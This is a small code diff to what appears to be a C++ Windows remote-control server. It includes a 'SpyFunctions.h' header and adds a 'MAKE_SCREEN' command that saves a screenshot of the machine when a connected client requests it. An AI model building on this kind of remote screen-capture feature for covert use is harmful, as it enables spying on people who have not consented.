@@ -15,6 +15,7 @@
 #include "ClipboardController.h"
 #include "MediaController.h"
 #include "SystemFunctions.h"
+#include "SpyFunctions.h"
 
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "wininet.lib")
@@ -456,6 +457,11 @@ void handleClient(SOCKET clientSock) {
                 std::string errorMsg = "ERROR";
                 send(clientSock, errorMsg.c_str(), errorMsg.size(), 0);
             }
+        }
+        // Make screenshot
+        else if (command.rfind("MAKE_SCREEN", 0) == 0)
+        {
+            SaveScreenToFile();
         }
         
 
